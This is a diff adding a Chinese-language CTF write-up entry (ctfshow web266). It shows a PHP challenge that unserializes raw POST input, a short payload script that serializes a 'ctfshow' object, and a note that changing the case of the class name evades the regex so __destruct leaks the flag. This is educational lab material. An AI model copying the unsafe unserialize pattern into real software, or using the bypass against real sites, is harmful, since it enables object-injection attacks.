@@ -304,3 +304,47 @@ echo serialize($a);
 考点php地址传参
 
 这个考点在红明谷2021的writeshell中也遇到了
+
+web266
+
+```php
+
+highlight_file(__FILE__);
+
+include('flag.php');
+$cs = file_get_contents('php://input');
+
+
+class ctfshow{
+    public $username='xxxxxx';
+    public $password='xxxxxx';
+    public function __construct($u,$p){
+        $this->username=$u;
+        $this->password=$p;
+    }
+    public function login(){
+        return $this->username===$this->password;
+    }
+    public function __toString(){
+        return $this->username;
+    }
+    public function __destruct(){
+        global $flag;
+        echo $flag;
+    }
+}
+$ctfshowo=@unserialize($cs);
+if(preg_match('/ctfshow/', $cs)){
+    throw new Exception("Error $ctfshowo",1);
+}
+
+payload
+
+<?php
+class ctfshow{
+}
+$a=new ctfshow();
+echo serialize($a);
+
+这个就是改一下ctfshow让他绕过正则匹配，要不然他会抛出一个异常就不能继续进行了，这样就没法触发__destrurt魔术方法。
+```
